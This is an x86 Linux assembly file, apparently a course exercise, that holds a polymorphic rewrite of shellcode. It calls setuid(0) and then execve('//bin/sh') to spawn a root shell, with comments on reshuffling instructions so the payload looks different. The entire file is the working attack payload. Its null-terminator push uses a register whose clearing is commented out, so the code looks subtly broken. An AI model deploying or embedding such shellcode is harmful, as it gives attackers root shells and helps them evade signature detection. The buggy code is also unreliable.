global _start

section .text

_start:

  ;-----------------------------------------------
  ; Original shellcode size is 44 bytes
  ; Limit size is 44 . 1.5 = 66 bytes
  ;-----------------------------------------------

   ; New polymorphic version
   ; Currently 52 bytes (+8)
   ; 25% increment
   ; -------------------------
   sub ebx,ebx				; different alternative instructions 
   and eax,ebx 				; to clear up eax and ebx
   ;mov ecx,ebx				; finnish clearing ecx. THIS MAY BE REMOVED. Overwriten by lea.
   
   add al,0x17				; eax is zero, so adding 0x17 is like moving directly
   int 0x80				; setuid(0)

   sub eax,eax				; another way to clear eax.
   mov dword [esp-0x4], eax		; move to the top of the stack, instead of pushing
   mov dword [esp-0x8], 0x68732f6e	; don't hardcode these. Can use AND,AND,2's complement? 
   mov dword [esp-0xc], 0x69622f2f       
   sub esp, 0xc				; adjust the stack pointer.
   
   mov ebx,esp				; keep this instruction equal 
   lea edx, [esp+0x8] 			; NO CHANGE 
   push ecx			        ; push a null using ecx instead of eax.		
   push ebx				; 
   lea ecx, [esp]			; NO CHANGE

   or al,0xb				; another way to move 0xb to al, since it is alerady zero
   int 0x80				; execve("//bin/sh",null,null)

   or al,0x1				; mov 1 to al and clear the upper parts of the register
   int 0x80				; exit()
